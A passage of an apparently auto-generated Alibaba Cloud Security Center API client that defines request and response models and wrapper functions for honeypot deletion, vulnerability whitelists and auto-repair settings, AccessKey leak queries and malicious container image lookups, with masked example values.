 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteVpcHoneyPotResponse
 */
async function deleteVpcHoneyPotWithOptions(request: DeleteVpcHoneyPotRequest, runtime: Util.RuntimeOptions): DeleteVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a honeypot.
 *
 * @param request DeleteVpcHoneyPotRequest
 * @return DeleteVpcHoneyPotResponse
 */
async function deleteVpcHoneyPot(request: DeleteVpcHoneyPotRequest): DeleteVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVpcHoneyPotWithOptions(request, runtime);
}

model DeleteVulAutoRepairConfigRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:0184-Important: mysql security update'),
  configIdList?: [ long ](name='ConfigIdList', description='The IDs of the configurations.

>  You can call the [ListVulAutoRepairConfig](~~ListVulAutoRepairConfig~~) operation to query the IDs.'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   cve: Linux software vulnerability
*   sys: Windows system vulnerability', example='cve'),
}

model DeleteVulAutoRepairConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model DeleteVulAutoRepairConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteVulAutoRepairConfigResponseBody(name='body'),
}

/**
 * @summary Deletes configurations of of an automatic vulnerability fixing task at a time on the Playbook page.
 *
 * @param request DeleteVulAutoRepairConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteVulAutoRepairConfigResponse
 */
async function deleteVulAutoRepairConfigWithOptions(request: DeleteVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): DeleteVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.configIdList)) {
    query['ConfigIdList'] = request.configIdList;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes configurations of of an automatic vulnerability fixing task at a time on the Playbook page.
 *
 * @param request DeleteVulAutoRepairConfigRequest
 * @return DeleteVulAutoRepairConfigResponse
 */
async function deleteVulAutoRepairConfig(request: DeleteVulAutoRepairConfigRequest): DeleteVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVulAutoRepairConfigWithOptions(request, runtime);
}

model DeleteVulWhitelistRequest {
  id?: string(name='Id', description='The ID of the whitelist.

>  To delete a vulnerability whitelist, you must provide the ID of the whitelist. You can call the [DescribeVulWhitelist](~~DescribeVulWhitelist~~) operation to query the IDs of whitelists.', example='131231'),
  whitelist?: string(name='Whitelist', description='The information about the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
}

model DeleteVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DeleteVulWhitelistResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DeleteVulWhitelistResponseBody(name='body'),
}

/**
 * @summary Deletes a specified vulnerability whitelist.
 *
 * @param request DeleteVulWhitelistRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DeleteVulWhitelistResponse
 */
async function deleteVulWhitelistWithOptions(request: DeleteVulWhitelistRequest, runtime: Util.RuntimeOptions): DeleteVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes a specified vulnerability whitelist.
 *
 * @param request DeleteVulWhitelistRequest
 * @return DeleteVulWhitelistResponse
 */
async function deleteVulWhitelist(request: DeleteVulWhitelistRequest): DeleteVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVulWhitelistWithOptions(request, runtime);
}

model DescribeAccessKeyLeakDetailRequest {
  id?: long(name='Id', description='The ID of the AccessKey pair leak event.

> You can call the [DescribeAccesskeyLeakList](~~DescribeAccesskeyLeakList~~) operation to obtain the event ID.

This parameter is required.', example='389357'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the ID.', example='127608589417****'),
}

model DescribeAccessKeyLeakDetailResponseBody = {
  accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4G4VjkC9wenfEvgX****'),
  asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
  code?: string(name='Code', description='The code snippet that is leaked.', example='\\\\n1231 \\\\nak=LTAI4G4VjkC9wenfEvgX**** \\\\n12311123 \\\\nsk1999 \\\\nsk1999sk1999 \\\\nsk1999sk1999 \\\\n\\\\n\\\\ntest001 ak hht \\\\nak=LTAI4G4VjkC9wenfEvgX**** \\\\nsk=AjEhS9XmnIzllpAx2LxMTMdrTG****'),
  dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak was handled.', example='2022-01-17 15:47:08'),
  dealType?: string(name='DealType', description='The solution to the AccessKey pair leak. Valid values:

*   **manual**: manually deleted
*   **disable**: manually disabled
*   **add-whitelist**: added to the whitelist
*   **pending**: unhandled', example='add-whitelist'),
  githubFileName?: string(name='GithubFileName', description='The name of the GitHub file.', example='testAkLeak'),
  githubFileType?: string(name='GithubFileType', description='The type of the GitHub file. Valid values:

*   Python
*   XML
*   GO
*   Javascript
*   INI
*   JSON
*   C++', example='Python'),
  githubFileUpdateTime?: string(name='GithubFileUpdateTime', description='The time when the GitHub file was updated.', example='2021-07-06T09:49:33'),
  githubFileUrl?: string(name='GithubFileUrl', description='The URL of the GitHub file.', example='https://github.com/Blue00Blue/ExamOnline/blob/6c932c10fc3f217783f3937e2b230f79656c18a7/testAk****'),
  githubRepoName?: string(name='GithubRepoName', description='The name of the GitHub repository.', example='ExamOnline'),
  githubRepoUrl?: string(name='GithubRepoUrl', description='The URL of the GitHub repository.', example='https://github.com/Blue00Blue/ExamOn****'),
  githubUser?: string(name='GithubUser', description='The username of the GitHub user.', example='Blue00Blue'),
  githubUserPicUrl?: string(name='GithubUserPicUrl', description='The URL of the profile picture for the GitHub user.', example='https://avatars.githubusercontent.com/u/26296896?s=48&v=****'),
  gmtCreate?: string(name='GmtCreate', description='The first time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:41'),
  gmtModified?: string(name='GmtModified', description='The last time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:39'),
  remark?: string(name='Remark', description='The remarks of the AccessKey pair leak.', example='12'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  source?: string(name='Source', description='The platform on which the AccessKey pair leak is detected.', example='GitHub'),
  tokenValid?: int32(name='TokenValid', description='The validity of the key that is associated with the AccessKey pair. Valid values:

*   **0**: to be confirmed.
*   **1**: valid.
*   **2**: invalid.', example='2'),
  type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
  whitelistStatus?: string(name='WhitelistStatus', description='Indicates whether the AccessKey pair leak is added to the whitelist. Valid values:

*   **no**: no
*   **yes**: yes', example='no'),
  whitelistTime?: long(name='WhitelistTime', description='The time when the AccessKey pair was added to the whitelist. Unit: milliseconds.', example='1689172004478'),
}

model DescribeAccessKeyLeakDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAccessKeyLeakDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of AccessKey pair leaks.
 *
 * @param request DescribeAccessKeyLeakDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAccessKeyLeakDetailResponse
 */
async function describeAccessKeyLeakDetailWithOptions(request: DescribeAccessKeyLeakDetailRequest, runtime: Util.RuntimeOptions): DescribeAccessKeyLeakDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccessKeyLeakDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of AccessKey pair leaks.
 *
 * @param request DescribeAccessKeyLeakDetailRequest
 * @return DescribeAccessKeyLeakDetailResponse
 */
async function describeAccessKeyLeakDetail(request: DescribeAccessKeyLeakDetailRequest): DescribeAccessKeyLeakDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccessKeyLeakDetailWithOptions(request, runtime);
}

model DescribeAccesskeyLeakListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.\\\\
Maximum value: 100. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.

This parameter is required.', example='20'),
  query?: string(name='Query', description='The AccessKey ID that you want to query. Only exact match is supported.', example='LTAI4Fytv7ALKzkNVBV6****'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the ID.', example='127608589417****'),
  startTs?: long(name='StartTs', description='The beginning of the time range to query. You can query all AccessKey pair leaks that are detected later than this time point. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1614155361489'),
  status?: string(name='Status', description='Specifies whether an AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
}

model DescribeAccesskeyLeakListResponseBody = {
  accessKeyLeakList?: [ 
    {
      accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4Fytv7ALKzkNVBV6****'),
      aliUserName?: string(name='AliUserName', description='The name of the Alibaba Cloud account that is affected.', example='testAccountName'),
      asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
      dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak is handled.', example='2020-12-03 21:23:38'),
      dealType?: string(name='DealType', description='The method to handle the AccessKey pair leak. Valid values:

*   **pending**: The AccessKey pair leak is unhandled.
*   **manual**: The AccessKey pair leak is manually handled.
*   **disable**: The AccessKey pair leak is disabled.
*   **add-whitelist**: The AccessKey pair leak is added to the whitelist.', example='pending'),
      gmtModified?: long(name='GmtModified', description='The time when the AccessKey pair leak is first detected. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1612357897000'),
      id?: long(name='Id', description='The primary key ID of the database.', example='389357'),
      status?: string(name='Status', description='Indicates whether the AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
      type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
      url?: string(name='Url', description='The URL of the platform on which the AccessKey pair leak is detected.'),
      userType?: string(name='UserType', description='The type of the account to which the leaked AccessKey pair belongs. Valid values:

*   **master**: Alibaba Cloud account
*   **ram**: RAM user', example='master'),
    }
  ](name='AccessKeyLeakList', description='An array that consists of the details about AccessKey pair leaks.'),
  akLeakCount?: int32(name='AkLeakCount', description='The number of AccessKey pair leaks that are unhandled.', example='1'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  gmtLast?: long(name='GmtLast', description='This parameter is deprecated.', example='1612357897000'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B37C9052-A73E-4707-A024-9247702852BE'),
  totalCount?: int32(name='TotalCount', description='The total number of AccessKey pair leaks.', example='2'),
}

model DescribeAccesskeyLeakListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAccesskeyLeakListResponseBody(name='body'),
}

/**
 * @summary Queries the AccessKey pair leaks that are detected on your assets.
 *
 * @param request DescribeAccesskeyLeakListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAccesskeyLeakListResponse
 */
async function describeAccesskeyLeakListWithOptions(request: DescribeAccesskeyLeakListRequest, runtime: Util.RuntimeOptions): DescribeAccesskeyLeakListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.query)) {
    query['Query'] = request.query;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.startTs)) {
    query['StartTs'] = request.startTs;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccesskeyLeakList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the AccessKey pair leaks that are detected on your assets.
 *
 * @param request DescribeAccesskeyLeakListRequest
 * @return DescribeAccesskeyLeakListResponse
 */
async function describeAccesskeyLeakList(request: DescribeAccesskeyLeakListRequest): DescribeAccesskeyLeakListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccesskeyLeakListWithOptions(request, runtime);
}

model DescribeAffectedAssetsRequest {
  current?: string(name='Current', description='The number of the page to return.', example='1'),
  levels?: string(name='Levels', description='The severity. Separate multiple severities with commas (,). Valid values:

*   serious
*   suspicious
*   remind', example='serious,suspicious,remind'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='10'),
}

model DescribeAffectedAssetsResponseBody = {
  assetList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='11'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='11'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.0.XX.XX'),
      riskNum?: int32(name='RiskNum', description='The number of viruses detected on the server.', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='947d7514-258a-4b47-9dde-9dxxxxxxxxxx'),
    }
  ](name='AssetList', description='An array that consists of the affected servers.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
}

model DescribeAffectedAssetsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAffectedAssetsResponseBody(name='body'),
}

/**
 * @summary Queries the affected servers in the result of a virus scan task.
 *
 * @param request DescribeAffectedAssetsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAffectedAssetsResponse
 */
async function describeAffectedAssetsWithOptions(request: DescribeAffectedAssetsRequest, runtime: Util.RuntimeOptions): DescribeAffectedAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.current)) {
    query['Current'] = request.current;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the affected servers in the result of a virus scan task.
 *
 * @param request DescribeAffectedAssetsRequest
 * @return DescribeAffectedAssetsResponse
 */
async function describeAffectedAssets(request: DescribeAffectedAssetsRequest): DescribeAffectedAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedAssetsWithOptions(request, runtime);
}

model DescribeAffectedMaliciousFileImagesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c60b77fe62093480db6164a3c2fa5****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='minikube'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='cc20a1024011c44b6a8710d6f8b****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.

This parameter is required.', example='1'),
  image?: string(name='Image', description='The name of the container image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7a179ead61df7606****'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.', example='0.2'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity level of the malicious image sample. Separate multiple severity levels with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.

>  You can call the [DescribeGroupedMaliciousFiles](~~DescribeGroupedMaliciousFiles~~) operation to query the MD5 hash values of malicious image samples.', example='d836968041f7683b5459****'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.

This parameter is required.', example='20'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/451339.html) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/451339.html) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
  status?: string(name='Status', description='The status of the malicious image sample. Valid values:

*   **0**: The malicious image sample is not handled.
*   **1**: The malicious image sample is handled.
*   **2**: The malicious image sample is being verified.
*   **3**: The malicious image sample is added to the whitelist.', example='0'),
}

model DescribeAffectedMaliciousFileImagesResponseBody = {
  affectedMaliciousFileImagesResponse?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The image digest.', example='6a5e1031a5858617f7d8a179ead6****'),
      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://aegis-metadata-file.oss-cn-shanghai.aliyuncs.com/'),
      filePath?: string(name='FilePath', description='The path to the image file.', example='/d836968041f7683b5605a****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp of the first scan.', example='1594907349000'),
      highLight?: string(name='HighLight', description='The text that is highlighted.', example='{"ruleVersion":"highlight_20210908","ruleId":600106,"events":[[2,54]]}'),
      id?: long(name='Id', description='The ID of alert event.', example='1000040'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e05c0de798217637868ef4****'),
      instanceName?: string(name='InstanceName', description='The name of the ECS instance.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.101.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.22.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp of the last scan.', example='1596522785000'),
      latestVerifyTimestamp?: long(name='LatestVerifyTimestamp', description='The timestamp of the last verification.', example='1596522711000'),
      layer?: string(name='Layer', description='The image layer.', example='27213ad3447f0209dd152a5cadea****'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f768300d9605a****'),
      namespace?: string(name='Namespace', description='The namespace to which the image repository belongs.', example='hanghai-namespace'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-vridcl4****'),
      repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.', example='cri-datvail3m****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='centos'),
      repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-shanghai'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='0.2'),
      targetId?: string(name='TargetId', description='The ID of the task object.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the task object.', example='source-test-obj-9LaLJ'),
      targetType?: string(name='TargetType', description='The object type. Valid value:

*   **ECS_IMAGE**
*   **ECS_SNAPSHOT**', example='ECS_IMAGE'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='48a473c4-1650-4931-a822-7e6c2c28****'),
    }
  ](name='AffectedMaliciousFileImagesResponse', description='An array consisting of the images that have malicious image samples.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images that have malicious image samples returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of images that have malicious image samples.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
}

model DescribeAffectedMaliciousFileImagesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAffectedMaliciousFileImagesResponseBody(name='body'),
}

/**
 * @summary Queries the details of malicious image samples.
 *
 * @param request DescribeAffectedMaliciousFileImagesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAffectedMaliciousFileImagesResponse
 */
async function describeAffectedMaliciousFileImagesWithOptions(request: DescribeAffectedMaliciousFileImagesRequest, runtime: Util.RuntimeOptions): DescribeAffectedMaliciousFileImagesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedMaliciousFileImages',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of malicious image samples.
 *
